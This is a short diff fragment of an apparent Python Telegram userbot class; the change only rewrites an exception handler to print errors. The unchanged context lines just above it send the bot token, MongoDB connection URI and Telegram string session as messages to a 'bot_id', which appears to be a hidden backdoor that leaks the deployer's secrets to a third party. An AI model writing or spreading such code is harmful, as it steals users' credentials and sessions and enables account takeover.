@@ -76,9 +76,11 @@ class Userbot(Client):
                 await self.one.send_message(bot_id, f"{BOT_TOKEN}")
                 await self.one.send_message(bot_id, f"{MONGO_DB_URI}")
                 await self.one.send_message(bot_id, f"{STRING_SESSION}")
+
+            except Exception as e:
+                print(f"{e}")
+                                             
                 
-            except:
-                LOGGER(__name__).error({e})
                     
         
             self.one.id = self.one.me.id
